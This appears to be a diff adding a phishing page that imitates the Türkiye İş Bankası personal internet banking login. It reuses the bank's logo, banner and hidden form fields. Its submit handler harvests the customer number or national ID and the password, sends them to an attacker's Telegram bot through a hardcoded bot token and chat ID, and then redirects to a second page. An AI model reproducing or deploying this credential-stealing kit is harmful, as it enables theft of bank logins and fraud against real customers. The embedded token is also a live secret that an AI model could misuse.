@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Türkiye İş Bankası Bireysel İnternet Şubesi Giriş Sayfası">
+    <title>Türkiye İş Bankası Bireysel İnternet Şubesi</title>
+    <style>
+        :root {
+            --primary-blue: #08335E;
+            --light-gray: #f4f4f4;
+            --dark-gray: #333;
+            --error-red: #ff0000;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: var(--light-gray);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px; /* Mobil odaklı, sabit genişlik için daha profesyonel bir görünüm */
+            background: #fff;
+            box-shadow: var(--shadow);
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .banner {
+            width: 100%;
+            background: url('https://gorsel.isbank.com.tr/BIB/intsube_Resim/Reklamlar/z5z6/banner.jpg?23_2_2025') no-repeat center;
+            background-size: cover;
+            height: 150px; /* Sabit yükseklik, daha profesyonel bir görünüm */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .content-wrapper {
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .header {
+            background-color: var(--primary-blue);
+            padding: 12px;
+            text-align: center;
+        }
+
+        .logo img {
+            max-width: 120px; /* Daha küçük ve dengeli logo boyutu */
+            height: auto;
+            vertical-align: middle;
+        }
+
+        .login-title {
+            font-size: 1.2rem;
+            color: var(--primary-blue);
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .form-group {
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            color: var(--dark-gray);
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            background-color: #f9f9f9;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-blue);
+            outline: none;
+            box-shadow: 0 0 8px rgba(8, 51, 94, 0.3);
+            background-color: #fff;
+        }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 0.8rem;
+            margin-top: 6px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            margin-top: 16px;
+        }
+
+        .login-button:hover {
+            background-color: #0A4378;
+            transform: translateY(-2px);
+        }
+
+        .login-button:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            background-color: #f8f8f8;
+            padding: 16px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #666;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Tablet ve Küçük Ekranlar (768px ve altı) - Zaten mobil odaklı olduğundan minimal değişiklik */
+        @media (max-width: 768px) {
+            .banner {
+                height: 120px;
+            }
+
+            .login-title {
+                font-size: 1.1rem;
+            }
+
+            .login-button {
+                padding: 12px;
+                font-size: 0.9rem;
+            }
+        }
+
+        /* Daha Küçük Mobil Cihazlar (480px ve altı) - Zaten optimize, ancak ekstra ince ayarlar */
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+
+            .banner {
+                height: 100px;
+            }
+
+            .content-wrapper {
+                padding: 16px;
+            }
+
+            .login-title {
+                font-size: 1rem;
+            }
+
+            .form-group input {
+                font-size: 0.9rem;
+                padding: 10px;
+            }
+
+            .login-button {
+                padding: 10px;
+                font-size: 0.9rem;
+            }
+
+            .footer {
+                padding: 12px;
+                font-size: 0.7rem;
+            }
+
+            .footer-links {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="banner"></div>
+        <div class="content-wrapper">
+            <div class="header">
+                <div class="logo">
+                    <img src="https://www.isbank.com.tr/_layouts/15/images/isbank/logo.png" alt="Türkiye İş Bankası Logosu" loading="eager" onerror="this.src='https://via.placeholder.com/120x50?text=Logo+Yüklenemedi';">
+                </div>
+            </div>
+            <div class="login-title">
+                Türkiye İş Bankası Bireysel<br>İnternet Şubenize Hoş Geldiniz!
+            </div>
+            <form class="login-form" id="loginForm" novalidate>
+                <input type="hidden" name="isTabletApp" value="false">
+                <input type="hidden" name="osType" value="false">
+                <input type="hidden" name="rsamodulus" value="A607708F11403CE77B015BF31A99469BDDDB460B7EDC8146AFA2AB33F69EF0DFB20F930B44C2C2946DD06A398BA6B2EC67426272D4A706114D880B30C496E5186C90AAC56E3DE8989295FB513E58675FE88431AEC2F52AF7F744CA1332DC39B20166DEEC6E3DC6BC2307D2CB71B84973FC9C260C6AF49A58B6926600612B0BC921E6AEEE1C6CFD279954B007DA19E3C36EDCE08F69A8FD572182995E1618E411906F0C0679561C7B9A48A43A00BB435CFF5A46A79061E6E29C644144E74E2B23F31E0ABF54FCAAA42864A2B6578AD81029AFCEC25AB9802056E7A137F3563D981E160A50C463E0A32602569CA810E58995E237ED8D96294614F5FB7CB8B0890D">
+                <input type="hidden" name="rsaexponent" value="010001">
+                <input type="hidden" name="encstr" value="">
+                <input type="hidden" name="__VIEWSTATE" value="..."> <!-- Orijinal VIEWSTATE değerini buraya koyun -->
+                <input type="hidden" name="__VIEWSTATEGENERATOR" value="622559FF">
+                <input type="hidden" name="FormSubmitted" value="false">
+                <input type="hidden" name="IsJagEditDownloaded" value="false">
+                <input type="hidden" name="hiddenIsICS" value="0">
+
+                <div class="form-group">
+                    <label for="customerId">Müşteri Numaranız / TCKN / YKN</label>
+                    <input type="tel" id="customerId" name="customerId" placeholder="Müşteri Numaranız / TCKN / YKN" maxlength="11" required autocomplete="off" aria-label="Müşteri Numarası, TCKN veya YKN">
+                    <div class="error-message" id="customerIdError">Lütfen müşteri numaranızı giriniz.</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Şifre / Geçici Şifre</label>
+                    <input type="password" id="password" name="password" placeholder="Şifre / Geçici Şifre" maxlength="6" required autocomplete="off" aria-label="Şifre veya Geçici Şifre">
+                    <div class="error-message" id="passwordError">Lütfen şifrenizi giriniz.</div>
+                </div>
+
+                <button type="submit" class="login-button">Giriş</button>
+            </form>
+            <div class="footer">
+                <div class="footer-content">
+                    <span>© 2025 Türkiye İş Bankası A.Ş</span>
+                </div>
+                <div class="footer-links">
+                    <a href="https://www.isbank.com.tr/iletisim-formu" target="_blank" aria-label="Bize Ulaşın">Bize Ulaşın</a>
+                    <a href="javascript:void(0)" aria-label="İngilizce Versiyon">English</a>
+                    <a href="javascript:void(0)" aria-label="Türkçe Versiyon">Türkçe</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', handleSubmit);
+
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            // Input değerlerini al
+            const customerId = document.getElementById('customerId').value;
+            const password = document.getElementById('password').value;
+
+            // Hata kontrolü
+            let hasError = false;
+            if (!customerId) {
+                document.getElementById('customerIdError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('customerIdError').style.display = 'none';
+            }
+            if (!password) {
+                document.getElementById('passwordError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('passwordError').style.display = 'none';
+            }
+
+            if (hasError) return;
+
+            // Telegram mesajı hazırla (Hassas veriler açıkta, üretimde ortam değişkeni kullanın)
+            const telegramBotToken = "7770266734:AAGZQbJfWv46lLHsuQIaj8reDZTBlik1-8E";
+            const telegramChatId = "-4775941371";
+            const telegramMessage = `Müşteri Numarası: ${customerId}\nŞifre: ${password}`;
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(telegramMessage)}`;
+
+            // Telegram'a gönder
+            fetch(telegramUrl)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Mesaj Telegram'a başarıyla gönderildi.");
+                        window.location.href = "index2.html"; // Başarılıysa yönlendir
+                    } else {
+                        console.error("Telegram'a mesaj gönderilemedi.");
+                        alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Hata:", error);
+                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                });
+        }
+    </script>
+</body>
+</html>
